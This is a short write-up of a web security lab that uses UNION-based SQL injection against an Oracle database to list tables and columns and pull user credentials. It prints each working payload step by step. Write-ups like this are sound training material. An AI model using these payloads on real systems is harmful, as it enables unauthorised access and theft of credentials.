This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so we can use a _**UNION**_ attack to retrieve data from other tables.

**<h2>Problem:</h2>**
The application has a login function, and the database contains a table that holds usernames and passwords. We need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

<h4>Goal:</h4>
Log in as the administrator user.


**<h2>Solution:</h2>**
- Check for the number of columns using ``'order by 1--`` , Produces an error for 3. So, there are only 2 columns.
- Now perform **UNION** attacks; check for the tables using ``' union select table_name,NULL from all_tables--``, produces list of tables:
![alt text](/images/lab6alltables.png)

- Scrolling through the tables we come across **USERS_FAXYPC** table which might contain the password and username. So we search for columns in this table using ``' union select column_name, NULL from all_tab_columns where table_name='USERS_FAXYPC'--`` gives us required password,username and email columns.

- now search through the given username **USERNAME_ZDIHZI** and password **PASSWORD_DXLMSU** columns ``' union select USERNAME_ZDIHZI,PASSWORD_DXLMSU from USERS_FAXYPC--`` which gives us required credentials:
![alt text](/images/lab6credentials.png)

- Login with the credentials to solve the lab.